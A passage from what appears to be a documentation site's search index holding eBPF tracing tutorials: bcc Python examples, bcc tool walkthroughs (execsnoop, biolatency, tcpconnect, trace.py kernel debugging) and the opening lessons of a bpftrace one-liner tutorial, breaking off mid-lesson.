nodejs_http_server.py","text":"<p>This program instruments a user statically-defined tracing (USDT) probe, which is the user-level version of a kernel tracepoint. Sample output:</p> <pre><code># nodejs_http_server.py 24728\nTIME(s)            COMM             PID    ARGS\n24653324.561322998 node             24728  path:/index.html\n24653335.343401998 node             24728  path:/images/welcome.png\n24653340.510164998 node             24728  path:/images/favicon.png\n</code></pre> <p>Relevant code from examples/tracing/nodejs_http_server.py:</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF, USDT\nimport sys\n\nif len(sys.argv) &lt; 2:\n    print(\"USAGE: nodejs_http_server PID\")\n    exit()\npid = sys.argv[1]\ndebug = 0\n\n# load BPF program\nbpf_text = \"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\nint do_trace(struct pt_regs *ctx) {\n    uint64_t addr;\n    char path[128]={0};\n    bpf_usdt_readarg(6, ctx, &amp;addr);\n    bpf_probe_read_user(&amp;path, sizeof(path), (void *)addr);\n    bpf_trace_printk(\"path:%s\\\\n\", path);\n    return 0;\n};\n\"\"\"\n\n# enable USDT probe from given PID\nu = USDT(pid=int(pid))\nu.enable_probe(probe=\"http__server__request\", fn_name=\"do_trace\")\nif debug:\n    print(u.get_text())\n    print(bpf_text)\n\n# initialize BPF\nb = BPF(text=bpf_text, usdt_contexts=[u])\n</code></pre> <p>Things to learn:</p> <ol> <li><code>bpf_usdt_readarg(6, ctx, &amp;addr)</code>: Read the address of argument 6 from the USDT probe into <code>addr</code>.</li> <li><code>bpf_probe_read_user(&amp;path, sizeof(path), (void *)addr)</code>: Now the string <code>addr</code> points to into our <code>path</code> variable.</li> <li><code>u = USDT(pid=int(pid))</code>: Initialize USDT tracing for the given PID.</li> <li><code>u.enable_probe(probe=\"http__server__request\", fn_name=\"do_trace\")</code>: Attach our <code>do_trace()</code> BPF C function to the Node.js <code>http__server__request</code> USDT probe.</li> <li><code>b = BPF(text=bpf_text, usdt_contexts=[u])</code>: Need to pass in our USDT object, <code>u</code>, to BPF object creation.</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-16-task_switchc","title":"Lesson 16. task_switch.c","text":"<p>This is an older tutorial included as a bonus lesson. Use this for recap and to reinforce what you've already learned.</p> <p>This is a slightly more complex tracing example than Hello World. This program will be invoked for every task change in the kernel, and record in a BPF map the new and old pids.</p> <p>The C program below introduces a new concept: the prev argument. This argument is treated specially by the BCC frontend, such that accesses to this variable are read from the saved context that is passed by the kprobe infrastructure. The prototype of the args starting from position 1 should match the prototype of the kernel function being kprobed. If done so, the program will have seamless access to the function parameters.</p> <pre><code>#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;linux/sched.h&gt;\n\nstruct key_t {\n    u32 prev_pid;\n    u32 curr_pid;\n};\n\nBPF_HASH(stats, struct key_t, u64, 1024);\nint count_sched(struct pt_regs *ctx, struct task_struct *prev) {\n    struct key_t key = {};\n    u64 zero = 0, *val;\n\n    key.curr_pid = bpf_get_current_pid_tgid();\n    key.prev_pid = prev-&gt;pid;\n\n    // could also use `stats.increment(key);`\n    val = stats.lookup_or_try_init(&amp;key, &amp;zero);\n    if (val) {\n      (*val)++;\n    }\n    return 0;\n}\n</code></pre> <p>The userspace component loads the file shown above, and attaches it to the <code>finish_task_switch</code> kernel function. The <code>[]</code> operator of the BPF object gives access to each BPF_HASH in the program, allowing pass-through access to the values residing in the kernel. Use the object as you would any other python dict object: read, update, and deletes are all allowed. <pre><code>from bcc import BPF\nfrom time import sleep\n\nb = BPF(src_file=\"task_switch.c\")\nb.attach_kprobe(event=\"finish_task_switch\", fn_name=\"count_sched\")\n\n# generate many schedule events\nfor i in range(0, 100): sleep(0.01)\n\nfor k, v in b[\"stats\"].items():\n    print(\"task_switch[%5d-&gt;%5d]=%u\" % (k.prev_pid, k.curr_pid, v.value))\n</code></pre></p> <p>These programs can be found in the files examples/tracing/task_switch.c and examples/tracing/task_switch.py respectively.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-17-further-study","title":"Lesson 17. Further Study","text":"<p>For further study, see Sasha Goldshtein's linux-tracing-workshop, which contains additional labs. There are also many tools in bcc /tools to study.</p> <p>Please read CONTRIBUTING-SCRIPTS.md if you wish to contribute tools to bcc. At the bottom of the main README.md, you'll also find methods for contacting us. Good luck, and happy tracing!</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#networking","title":"Networking","text":"<p>To do.</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/tutorial_en/","title":"bcc Tutorial","text":"<p>This tutorial covers how to use bcc tools to quickly solve performance, troubleshooting, and networking issues. If you want to develop new bcc tools, see tutorial_bcc_python_developer.md for that tutorial.</p> <p>It is assumed for this tutorial that bcc is already installed, and you can run tools like execsnoop successfully. See INSTALL.md. This uses enhancements added to the Linux 4.x series.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#observability","title":"Observability","text":"<p>Some quick wins.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#0-before-bcc","title":"0. Before bcc","text":"<p>Before using bcc, you should start with the Linux basics. One reference is the Linux Performance Analysis in 60,000 Milliseconds post, which covers these commands:</p> <ol> <li>uptime</li> <li>dmesg | tail</li> <li>vmstat 1</li> <li>mpstat -P ALL 1</li> <li>pidstat 1</li> <li>iostat -xz 1</li> <li>free -m</li> <li>sar -n DEV 1</li> <li>sar -n TCP,ETCP 1</li> <li>top</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_en/#1-general-performance","title":"1. General Performance","text":"<p>Here is a generic checklist for performance investigations with bcc, first as a list, then in detail:</p> <ol> <li>execsnoop</li> <li>opensnoop</li> <li>ext4slower (or btrfs*, xfs*, zfs*)</li> <li>biolatency</li> <li>biosnoop</li> <li>cachestat</li> <li>tcpconnect</li> <li>tcpaccept</li> <li>tcpretrans</li> <li>runqlat</li> <li>profile</li> </ol> <p>These tools may be installed on your system under /usr/share/bcc/tools, or you can run them from the bcc github repo under /tools where they have a .py extension. Browse the 50+ tools available for more analysis options.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#11-execsnoop","title":"1.1 execsnoop","text":"<pre><code># ./execsnoop\nPCOMM            PID    RET ARGS\nsupervise        9660     0 ./run\nsupervise        9661     0 ./run\nmkdir            9662     0 /bin/mkdir -p ./main\nrun              9663     0 ./run\n[...]\n</code></pre> <p>execsnoop prints one line of output for each new process. Check for short-lived processes. These can consume CPU resources, but not show up in most monitoring tools that periodically take snapshots of which processes are running.</p> <p>It works by tracing exec(), not the fork(), so it will catch many types of new processes but not all (eg, it won't see an application launching working processes, that doesn't exec() anything else).</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#12-opensnoop","title":"1.2. opensnoop","text":"<pre><code># ./opensnoop\nPID    COMM               FD ERR PATH\n1565   redis-server        5   0 /proc/1565/stat\n1565   redis-server        5   0 /proc/1565/stat\n1565   redis-server        5   0 /proc/1565/stat\n1603   snmpd               9   0 /proc/net/dev\n1603   snmpd              11   0 /proc/net/if_inet6\n1603   snmpd              -1   2 /sys/class/net/eth0/device/vendor\n1603   snmpd              11   0 /proc/sys/net/ipv4/neigh/eth0/retrans_time_ms\n1603   snmpd              11   0 /proc/sys/net/ipv6/neigh/eth0/retrans_time_ms\n1603   snmpd              11   0 /proc/sys/net/ipv6/conf/eth0/forwarding\n[...]\n</code></pre> <p>opensnoop prints one line of output for each open() syscall, including details.</p> <p>Files that are opened can tell you a lot about how applications work: identifying their data files, config files, and log files. Sometimes applications can misbehave, and perform poorly, when they are constantly attempting to read files that do not exist. opensnoop gives you a quick look.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#13-ext4slower-or-btrfs-xfs-zfs","title":"1.3. ext4slower (or btrfs*, xfs*, zfs*)","text":"<pre><code># ./ext4slower\nTracing ext4 operations slower than 10 ms\nTIME     COMM           PID    T BYTES   OFF_KB   LAT(ms) FILENAME\n06:35:01 cron           16464  R 1249    0          16.05 common-auth\n06:35:01 cron           16463  R 1249    0          16.04 common-auth\n06:35:01 cron           16465  R 1249    0          16.03 common-auth\n06:35:01 cron           16465  R 4096    0          10.62 login.defs\n06:35:01 cron           16464  R 4096    0          10.61 login.defs\n</code></pre> <p>ext4slower traces the ext4 file system and times common operations, and then only prints those that exceed a threshold.</p> <p>This is great for identifying or exonerating one type of performance issue: show individually slow disk i/O via the file system. Disks process I/O asynchronously, and it can be difficult to associate latency at that layer with the latency applications experience. Tracing higher up in the kernel stack, at the VFS -&gt; file system interface, will more closely match what an application suffers. Use this tool to identify if file system latency exceeds a given threshold.</p> <p>Similar tools exist in bcc for other file systems: btrfsslower, xfsslower, and zfsslower. There is also fileslower, which works at the VFS layer and traces everything (although at some higher overhead).</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#14-biolatency","title":"1.4. biolatency","text":"<pre><code># ./biolatency\nTracing block device I/O... Hit Ctrl-C to end.\n^C\n     usecs           : count     distribution\n       0 -&gt; 1        : 0        |                                      |\n       2 -&gt; 3        : 0        |                                      |\n       4 -&gt; 7        : 0        |                                      |\n       8 -&gt; 15       : 0        |                                      |\n      16 -&gt; 31       : 0        |                                      |\n      32 -&gt; 63       : 0        |                                      |\n      64 -&gt; 127      : 1        |                                      |\n     128 -&gt; 255      : 12       |********                              |\n     256 -&gt; 511      : 15       |**********                            |\n     512 -&gt; 1023     : 43       |*******************************       |\n    1024 -&gt; 2047     : 52       |**************************************|\n    2048 -&gt; 4095     : 47       |**********************************    |\n    4096 -&gt; 8191     : 52       |**************************************|\n    8192 -&gt; 16383    : 36       |**************************            |\n   16384 -&gt; 32767    : 15       |**********                            |\n   32768 -&gt; 65535    : 2        |*                                     |\n   65536 -&gt; 131071   : 2        |*                                     |\n</code></pre> <p>biolatency traces disk I/O latency (time from device issue to completion), and when the tool ends (Ctrl-C, or a given interval), it prints a histogram summary of the latency.</p> <p>This is great for understanding disk I/O latency beyond the average times given by tools like iostat. I/O latency outliers will be visible at the end of the distribution, as well as multi-mode distributions.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#15-biosnoop","title":"1.5. biosnoop","text":"<pre><code># ./biosnoop\nTIME(s)        COMM           PID    DISK    T  SECTOR    BYTES   LAT(ms)\n0.000004001    supervise      1950   xvda1   W  13092560  4096       0.74\n0.000178002    supervise      1950   xvda1   W  13092432  4096       0.61\n0.001469001    supervise      1956   xvda1   W  13092440  4096       1.24\n0.001588002    supervise      1956   xvda1   W  13115128  4096       1.09\n1.022346001    supervise      1950   xvda1   W  13115272  4096       0.98\n1.022568002    supervise      1950   xvda1   W  13188496  4096       0.93\n[...]\n</code></pre> <p>biosnoop prints a line of output for each disk I/O, with details including latency (time from device issue to completion).</p> <p>This allows you to examine disk I/O in more detail, and look for time-ordered patterns (eg, reads queueing behind writes). Note that the output will be verbose if your system performs disk I/O at a high rate.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#16-cachestat","title":"1.6. cachestat","text":"<pre><code># ./cachestat\n    HITS   MISSES  DIRTIES  READ_HIT% WRITE_HIT%   BUFFERS_MB  CACHED_MB\n    1074       44       13      94.9%       2.9%            1        223\n    2195      170        8      92.5%       6.8%            1        143\n     182       53       56      53.6%       1.3%            1        143\n   62480    40960    20480      40.6%      19.8%            1        223\n       7        2        5      22.2%      22.2%            1        223\n     348        0        0     100.0%       0.0%            1        223\n[...]\n</code></pre> <p>cachestat prints a one line summary every second (or every custom interval) showing statistics from the file system cache.</p> <p>Use this to identify a low cache hit ratio, and a high rate of misses: which gives one lead for performance tuning.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#17-tcpconnect","title":"1.7. tcpconnect","text":"<pre><code># ./tcpconnect\nPID    COMM         IP SADDR            DADDR            DPORT\n1479   telnet       4  127.0.0.1        127.0.0.1        23\n1469   curl         4  10.201.219.236   54.245.105.25    80\n1469   curl         4  10.201.219.236   54.67.101.145    80\n1991   telnet       6  ::1              ::1              23\n2015   ssh          6  fe80::2000:bff:fe82:3ac fe80::2000:bff:fe82:3ac 22\n[...]\n</code></pre> <p>tcpconnect prints one line of output for every active TCP connection (eg, via connect()), with details including source and destination addresses.</p> <p>Look for unexpected connections that may point to inefficiencies in application configuration, or an intruder.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#18-tcpaccept","title":"1.8. tcpaccept","text":"<pre><code># ./tcpaccept\nPID    COMM         IP RADDR            LADDR            LPORT\n907    sshd         4  192.168.56.1     192.168.56.102   22\n907    sshd         4  127.0.0.1        127.0.0.1        22\n5389   perl         6  1234:ab12:2040:5020:2299:0:5:0 1234:ab12:2040:5020:2299:0:5:0 7001\n[...]\n</code></pre> <p>tcpaccept prints one line of output for every passive TCP connection (eg, via accept()), with details including source and destination addresses.</p> <p>Look for unexpected connections that may point to inefficiencies in application configuration, or an intruder.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#19-tcpretrans","title":"1.9. tcpretrans","text":"<pre><code># ./tcpretrans\nTIME     PID    IP LADDR:LPORT          T&gt; RADDR:RPORT          STATE\n01:55:05 0      4  10.153.223.157:22    R&gt; 69.53.245.40:34619   ESTABLISHED\n01:55:05 0      4  10.153.223.157:22    R&gt; 69.53.245.40:34619   ESTABLISHED\n01:55:17 0      4  10.153.223.157:22    R&gt; 69.53.245.40:22957   ESTABLISHED\n[...]\n</code></pre> <p>tcprerans prints one line of output for every TCP retransmit packet, with details including source and destination addresses, and kernel state of the TCP connection.</p> <p>TCP retransmissions cause latency and throughput issues. For ESTABLISHED retransmits, look for patterns with networks. For SYN_SENT, this may point to target kernel CPU saturation and kernel packet drops.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#110-runqlat","title":"1.10. runqlat","text":"<pre><code># ./runqlat\nTracing run queue latency... Hit Ctrl-C to end.\n^C\n     usecs               : count     distribution\n         0 -&gt; 1          : 233      |***********                             |\n         2 -&gt; 3          : 742      |************************************    |\n         4 -&gt; 7          : 203      |**********                              |\n         8 -&gt; 15         : 173      |********                                |\n        16 -&gt; 31         : 24       |*                                       |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 30       |*                                       |\n       128 -&gt; 255        : 6        |                                        |\n       256 -&gt; 511        : 3        |                                        |\n       512 -&gt; 1023       : 5        |                                        |\n      1024 -&gt; 2047       : 27       |*                                       |\n      2048 -&gt; 4095       : 30       |*                                       |\n      4096 -&gt; 8191       : 20       |                                        |\n      8192 -&gt; 16383      : 29       |*                                       |\n     16384 -&gt; 32767      : 809      |****************************************|\n     32768 -&gt; 65535      : 64       |***                                     |\n</code></pre> <p>runqlat times how long threads were waiting on the CPU run queues, and prints this as a histogram.</p> <p>This can help quantify time lost waiting for a turn on CPU, during periods of CPU saturation.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#111-profile","title":"1.11. profile","text":"<pre><code># ./profile\nSampling at 49 Hertz of all threads by user + kernel stack... Hit Ctrl-C to end.\n^C\n    00007f31d76c3251 [unknown]\n    47a2c1e752bf47f7 [unknown]\n    -                sign-file (8877)\n        1\n\n    ffffffff813d0af8 __clear_user\n    ffffffff813d5277 iov_iter_zero\n    ffffffff814ec5f2 read_iter_zero\n    ffffffff8120be9d __vfs_read\n    ffffffff8120c385 vfs_read\n    ffffffff8120d786 sys_read\n    ffffffff817cc076 entry_SYSCALL_64_fastpath\n    00007fc5652ad9b0 read\n    -                dd (25036)\n        4\n\n    0000000000400542 func_a\n    0000000000400598 main\n    00007f12a133e830 __libc_start_main\n    083e258d4c544155 [unknown]\n    -                func_ab (13549)\n        5\n\n[...]\n\n    ffffffff8105eb66 native_safe_halt\n    ffffffff8103659e default_idle\n    ffffffff81036d1f arch_cpu_idle\n    ffffffff810bba5a default_idle_call\n    ffffffff810bbd07 cpu_startup_entry\n    ffffffff8104df55 start_secondary\n    -                swapper/1 (0)\n        75\n</code></pre> <p>profile is a CPU profiler, which takes samples of stack traces at timed intervals, and prints a summary of unique stack traces and a count of their occurrence.</p> <p>Use this tool to understand the code paths that are consuming CPU resources.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#2-observability-with-generic-tools","title":"2. Observability with Generic Tools","text":"<p>In addition to the above tools for performance tuning, below is a checklist for bcc generic tools, first as a list, and in detail:</p> <ol> <li>trace</li> <li>argdist</li> <li>funccount</li> </ol> <p>These generic tools may be useful to provide visibility to solve your specific problems.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#21-trace","title":"2.1. trace","text":""},{"location":"tutorials/bcc-documents/tutorial_en/#example-1","title":"Example 1","text":"<p>Suppose you want to track file ownership change. There are three syscalls, <code>chown</code>, <code>fchown</code> and <code>lchown</code> which users can use to change file ownership. The corresponding syscall entry is <code>SyS_[f|l]chown</code>.  The following command can be used to print out syscall parameters and the calling process user id. You can use <code>id</code> command to find the uid of a particular user.</p> <pre><code>$ trace.py \\\n  'p::SyS_chown \"file = %s, to_uid = %d, to_gid = %d, from_uid = %d\", arg1, arg2, arg3, $uid' \\\n  'p::SyS_fchown \"fd = %d, to_uid = %d, to_gid = %d, from_uid = %d\", arg1, arg2, arg3, $uid' \\\n  'p::SyS_lchown \"file = %s, to_uid = %d, to_gid = %d, from_uid = %d\", arg1, arg2, arg3, $uid'\nPID    TID    COMM         FUNC             -\n1269255 1269255 python3.6    SyS_lchown       file = /tmp/dotsync-usisgezu/tmp, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269441 1269441 zstd         SyS_chown        file = /tmp/dotsync-vic7ygj0/dotsync-package.zst, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269255 1269255 python3.6    SyS_lchown       file = /tmp/dotsync-a40zd7ev/tmp, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269442 1269442 zstd         SyS_chown        file = /tmp/dotsync-gzp413o_/dotsync-package.zst, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269255 1269255 python3.6    SyS_lchown       file = /tmp/dotsync-whx4fivm/tmp/.bash_profile, to_uid = 128203, to_gid = 100, from_uid = 128203\n</code></pre>"},{"location":"tutorials/bcc-documents/tutorial_en/#example-2","title":"Example 2","text":"<p>Suppose you want to count nonvoluntary context switches (<code>nvcsw</code>) in your bpf based performance monitoring tools and you do not know what is the proper method. <code>/proc/&lt;pid&gt;/status</code> already tells you the number (<code>nonvoluntary_ctxt_switches</code>) for a pid and you can use <code>trace.py</code> to do a quick experiment to verify your method. With kernel source code, the <code>nvcsw</code> is counted at file <code>linux/kernel/sched/core.c</code> function <code>__schedule</code> and under condition <pre><code>!(!preempt &amp;&amp; prev-&gt;state) // i.e., preempt || !prev-&gt;state\n</code></pre></p> <p>The <code>__schedule</code> function is marked as <code>notrace</code>, and the best place to evaluate the above condition seems in <code>sched/sched_switch</code> tracepoint called inside function <code>__schedule</code> and defined in <code>linux/include/trace/events/sched.h</code>. <code>trace.py</code> already has <code>args</code> being the pointer to the tracepoint <code>TP_STRUCT__entry</code>.  The above condition in function <code>__schedule</code> can be represented as <pre><code>args-&gt;prev_state == TASK_STATE_MAX || args-&gt;prev_state == 0\n</code></pre></p> <p>The below command can be used to count the involuntary context switches (per process or per pid) and compare to <code>/proc/&lt;pid&gt;/status</code> or <code>/proc/&lt;pid&gt;/task/&lt;task_id&gt;/status</code> for correctness, as in typical cases, involuntary context switches are not very common. <pre><code>$ trace.py -p 1134138 't:sched:sched_switch (args-&gt;prev_state == TASK_STATE_MAX || args-&gt;prev_state == 0)'\nPID    TID    COMM         FUNC\n1134138 1134140 contention_test sched_switch\n1134138 1134142 contention_test sched_switch\n...\n$ trace.py -L 1134140 't:sched:sched_switch (args-&gt;prev_state == TASK_STATE_MAX || args-&gt;prev_state == 0)'\nPID    TID    COMM         FUNC\n1134138 1134140 contention_test sched_switch\n1134138 1134140 contention_test sched_switch\n...\n</code></pre></p>"},{"location":"tutorials/bcc-documents/tutorial_en/#example-3","title":"Example 3","text":"<p>This example is related to issue 1231 and 1516 where uprobe does not work at all in certain cases. First, you can do a <code>strace</code> as below</p> <pre><code>$ strace trace.py 'r:bash:readline \"%s\", retval'\n...\nperf_event_open(0x7ffd968212f0, -1, 0, -1, 0x8 /* PERF_FLAG_??? */) = -1 EIO (Input/output error)\n...\n</code></pre> <p>The <code>perf_event_open</code> syscall returns <code>-EIO</code>. Digging into kernel uprobe related codes in <code>/kernel/trace</code> and <code>/kernel/events</code> directories to search <code>EIO</code>, the function <code>uprobe_register</code> is the most suspicious. Let us find whether this function is called or not and what is the return value if it is called. In one terminal using the following command to print out the return value of uprobe_register, <pre><code>$ trace.py 'r::uprobe_register \"ret = %d\", retval'\n</code></pre> In another terminal run the same bash uretprobe tracing example, and you should get <pre><code>$ trace.py 'r::uprobe_register \"ret = %d\", retval'\nPID    TID    COMM         FUNC             -\n1041401 1041401 python2.7    uprobe_register  ret = -5\n</code></pre></p> <p>The <code>-5</code> error code is EIO. This confirms that the following code in function <code>uprobe_register</code> is the most suspicious culprit. <pre><code> if (!inode-&gt;i_mapping-&gt;a_ops-&gt;readpage &amp;&amp; !shmem_mapping(inode-&gt;i_mapping))\n        return -EIO;\n</code></pre> The <code>shmem_mapping</code> function is defined as <pre><code>bool shmem_mapping(struct address_space *mapping)\n{\n        return mapping-&gt;a_ops == &amp;shmem_aops;\n}\n</code></pre></p> <p>To confirm the theory, find what is <code>inode-&gt;i_mapping-&gt;a_ops</code> with the following command <pre><code>$ trace.py -I 'linux/fs.h' 'p::uprobe_register(struct inode *inode) \"a_ops = %llx\", inode-&gt;i_mapping-&gt;a_ops'\nPID    TID    COMM         FUNC             -\n814288 814288 python2.7    uprobe_register  a_ops = ffffffff81a2adc0\n^C$ grep ffffffff81a2adc0 /proc/kallsyms\nffffffff81a2adc0 R empty_aops\n</code></pre></p> <p>The kernel symbol <code>empty_aops</code> does not have <code>readpage</code> defined and hence the above suspicious condition is true. Further examining the kernel source code shows that <code>overlayfs</code> does not provide its own <code>a_ops</code> while some other file systems (e.g., ext4) define their own <code>a_ops</code> (e.g., <code>ext4_da_aops</code>), and <code>ext4_da_aops</code> defines <code>readpage</code>. Hence, uprobe works fine on ext4 while not on overlayfs.</p> <p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#22-argdist","title":"2.2. argdist","text":"<p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#23-funccount","title":"2.3. funccount","text":"<p>More examples.</p>"},{"location":"tutorials/bcc-documents/tutorial_en/#networking","title":"Networking","text":"<p>To do.</p> <p>Share on  Share on </p>"},{"location":"tutorials/bpftrace-tutorial/","title":"The bpftrace One-Liner Tutorial","text":"<p>This teaches you bpftrace for Linux in 12 easy lessons, where each lesson is a one-liner you can try running. This series of one-liners introduces concepts which are summarized as bullet points. For a full reference to bpftrace, see the Man page</p> <p>Contributed by Brendan Gregg, Netflix (2018), based on his FreeBSD DTrace Tutorial.</p>"},{"location":"tutorials/bpftrace-tutorial/#lesson-1-listing-probes","title":"Lesson 1. Listing Probes","text":"<pre><code>bpftrace -l 'tracepoint:syscalls:sys_enter_*'\n</code></pre> <p>\"bpftrace -l\" lists all probes, and a search term can be added.</p> <ul> <li>A probe is an instrumentation point for capturing event data.</li> <li>The supplied search term supports wildcards/globs (<code>*</code> and <code>?</code>)</li> <li>\"bpftrace -l\" can also be piped to grep(1) for full regular expression searching.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-2-hello-world","title":"Lesson 2. Hello World","text":"<pre><code># bpftrace -e 'BEGIN { printf(\"hello world\\n\"); }'\nAttaching 1 probe...\nhello world\n^C\n</code></pre> <p>This prints a welcome message. Run it, then hit Ctrl-C to end.</p> <ul> <li>The word <code>BEGIN</code> is a special probe that fires at the start of the program (like awk's BEGIN). You can use it to set variables and print headers.</li> <li>An action can be associated with probes, in { }. This example calls printf() when the probe fires.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-3-file-opens","title":"Lesson 3. File Opens","text":"<pre><code># bpftrace -e 'tracepoint:syscalls:sys_enter_openat { printf(\"%s %s\\n\", comm, str(args.filename)); }'\nAttaching 1 probe...\nsnmp-pass /proc/cpuinfo\nsnmp-pass /proc/stat\nsnmpd /proc/net/dev\nsnmpd /proc/net/if_inet6\n^C\n</code></pre> <p>This traces file opens as they happen, and we're printing the process name and pathname.</p> <ul> <li>It begins with the probe <code>tracepoint:syscalls:sys_enter_openat</code>: this is the tracepoint probe type (kernel static tracing), and is instrumenting when the <code>openat()</code> syscall begins (is entered). Tracepoints are preferred over kprobes (kernel dynamic tracing, introduced in lesson 6), since tracepoints have stable API. Note: In modern Linux systems (glibc &gt;= 2.26) the <code>open</code> wrapper always calls the <code>openat</code> syscall.</li> <li><code>comm</code> is a builtin variable that has the current process's name. Other similar builtins include pid and tid.</li> <li><code>args</code> is a struct containing all the tracepoint arguments. This struct is automatically generated by bpftrace based tracepoint information. The members of this struct can be found with: <code>bpftrace -vl tracepoint:syscalls:sys_enter_openat</code>.</li> <li><code>args.filename</code> accesses the <code>args</code> struct and gets the value of the   <code>filename</code> member.</li> <li><code>str()</code> turns a pointer into the string it points to.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-4-syscall-counts-by-process","title":"Lesson 4. Syscall Counts By Process","text":"<pre><code>bpftrace -e 'tracepoint:raw_syscalls:sys_enter { @[comm] = count(); }'\nAttaching 1 probe...\n^C\n\n@[bpftrace]: 6\n@[systemd]: 24\n@[snmp-pass]: 96\n@[sshd]: 125\n</code></pre> <p>This summarizes syscalls by process name, printing a report on Ctrl-C.</p> <ul> <li>@: This denotes a special variable type called a map, which can store and summarize data in different ways. You can add an optional variable name after the @, eg \"@num\", either to improve readability, or to differentiate between more than one map.</li> <li>[]: The optional brackets allow a key to be set for the map, much like an associative array.</li> <li>count(): This is a map function \u2013 the way it is populated. count() counts the number of times it is called. Since this is saved by comm, the result is a frequency count of system calls by process name.</li> </ul> <p>Maps are automatically printed when bpftrace ends (eg, via Ctrl-C).</p>"},{"location":"tutorials/bpftrace-tutorial/#lesson-5-distribution-of-read-bytes","title":"Lesson 5. Distribution of read() Bytes","text":"<pre><code># bpftrace -e 'tracepoint:syscalls:sys_exit_read /pid == 18644/ { @bytes = hist(args.ret); }'\nAttaching 1 probe...\n^C\n\n@bytes:\n[0, 1]                12 |@@@@@@@@@@@@@@@@@@@@                                |\n[2, 4)                18 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     |\n[4, 8)                 0 |                                                    |\n[8, 16)                0 |                                                    |\n[16, 32)               0 |                                                    |\n[32, 64)              30 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[64, 128)             19 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    |\n[128, 256)             1 |@\n</code></pre> <p>This summarizes the return value of the sys_read() kernel function for PID 18644, printing it as a histogram.</p> <ul> <li>/.../: This is a filter (aka predicate), which acts as a filter for the action. The action is only executed if the filtered expression is true, in this case, only for the process ID 18644. Boolean operators are supported (\"&amp;&amp;\", \"||\").</li> <li>ret: This is the return value of the function. For sys_read(), this is either -1 (error) or the number of bytes successfully read.</li> <li>@: This is a map similar to the previous lesson, but without any keys ([]) this time, and the name \"bytes\" which decorates the output.</li> <li>hist(): This is a map function which summarizes the argument as a power-of-2 histogram. The output shows rows that begin with interval notation, where, for example <code>[128, 256)</code> means that the value is: 128 &lt;= value &lt; 256. The next number is the count of occurrences, and then an ASCII histogram is printed to visualize that count. The histogram can be used to study multi-modal distributions.</li> <li>Other map functions include lhist() (linear hist), count(), sum(), avg(), min(), and max().</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-6-kernel-dynamic-tracing-of-read-bytes","title":"Lesson 6. Kernel Dynamic Tracing of read() Bytes","text":"<pre><code># bpftrace -e 'kretprobe:vfs_read { @bytes = lhist(retval, 0, 2000, 200); }'\nAttaching 1 probe...\n^C\n\n@bytes:\n(...,0]                0 |                                                    |\n[0, 200)              66 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[200, 400)             2 |@                                                   |\n[400, 600)             3 |@@                                                  |\n[600, 800)             0 |                                                    |\n[800, 1000)            5 |@@@                                                 |\n[1000, 1200)           0 |                                                    |\n[1200, 1400)           0 |                                                    |\n[1400, 1600)           0 |                                                    |\n[1600, 1800)           0 |                                                    |\n[1800, 2000)           0 |                                                    |\n[2000,...)            39 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      |\n</code></pre> <p>Summarize read() bytes as a linear histogram, and traced using kernel dynamic tracing.</p> <ul> <li>It begins with the probe <code>kretprobe:vfs_read</code>: this is the kretprobe probe type (kernel dynamic tracing of function returns) instrumenting the <code>vfs_read()</code> kernel function. There is also the kprobe probe type (shown in the next lesson), to instrument when functions begin execution (are entered). These are powerful probe types, letting you trace tens of thousands of different kernel functions. However, these are \"unstable\" probe types: since they can trace any kernel function, there is no guarantee that your kprobe/kretprobe will work between kernel versions, as the function names, arguments, return values, and roles may change. Also, since it is tracing the raw kernel, you'll need to browse the kernel source to understand what these probes, arguments, and return values, mean.</li> <li>lhist(): this is a linear histogram, where the arguments are: value, min, max, step. The first argument (<code>retval</code>) of vfs_read() is the return value: the number of bytes read.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-7-timing-reads","title":"Lesson 7. Timing read()s","text":"<pre><code># bpftrace -e 'kprobe:vfs_read { @start[tid] = nsecs; } kretprobe:vfs_read /@start[tid]/ { @ns[comm] = hist(nsecs - @start[tid]); delete(@start[tid]); }'\nAttaching 2 